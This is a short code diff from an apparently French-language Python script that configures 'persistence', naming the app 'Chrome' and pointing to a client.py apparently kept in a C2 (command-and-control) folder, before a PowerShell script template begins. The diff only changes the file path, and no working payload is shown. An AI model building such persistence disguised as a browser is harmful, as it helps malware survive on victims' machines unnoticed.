@@ -5,7 +5,7 @@ import subprocess
 
 # Configuration de la persistance
 app_name = "Chrome"
-app_path = r"C:\Users\ldard\Bureau\Codes\C2\client.py"
+app_path = r"client.py"
 
 powershell_script = f"""
 $AppName = "{app_name}"
